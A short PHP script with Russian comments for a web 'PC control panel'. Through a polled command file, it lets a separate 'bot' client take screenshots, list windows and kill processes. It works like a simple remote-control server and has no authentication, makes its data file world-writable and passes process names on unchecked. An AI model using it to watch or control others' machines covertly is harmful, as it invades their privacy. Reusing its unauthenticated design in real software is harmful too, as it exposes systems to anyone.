<?php
// Файл для хранения команды
$dataFile = 'data.txt';

// Если файла нет, создаем его и даем права на запись
if (!file_exists($dataFile)) {
    file_put_contents($dataFile, 'none');
    chmod($dataFile, 0666);
}

// 1. Бот спрашивает: "Есть команды?"
if (isset($_GET['get_cmd'])) {
    echo trim(file_get_contents($dataFile));
    exit;
}

// 2. Бот говорит: "Команду выполнил, сотри её"
if (isset($_GET['clear_cmd'])) {
    file_put_contents($dataFile, 'none');
    echo "ok";
    exit;
}

// 3. Обработка команд с сайта
if (isset($_POST['set_cmd'])) {
    $cmd = $_POST['set_cmd'];
    // Если команда delete, добавляем имя процесса
    if ($cmd == 'delete' && !empty($_POST['proc_name'])) {
        $cmd .= ' ' . trim($_POST['proc_name']);
    }
    file_put_contents($dataFile, $cmd);
    header("Location: /");
    exit;
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Панель управления</title>
    <style>
        body { background: #1a1a24; color: #fff; font-family: sans-serif; text-align: center; padding: 20px; }
        button { background: #4f46e5; color: white; border: none; padding: 15px; margin: 5px; border-radius: 8px; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Управление ПК</h1>
    <p>Текущая команда: <b><?php echo htmlspecialchars(trim(file_get_contents($dataFile))); ?></b></p>
    
    <form method="POST">
        <button name="set_cmd" value="screen">Сделать скриншот</button>
        <button name="set_cmd" value="app">Список окон</button>
        <input type="text" name="proc_name" placeholder="Процесс для kill">
        <button name="set_cmd" value="delete">Убить процесс</button>
    </form>
</body>
</html>
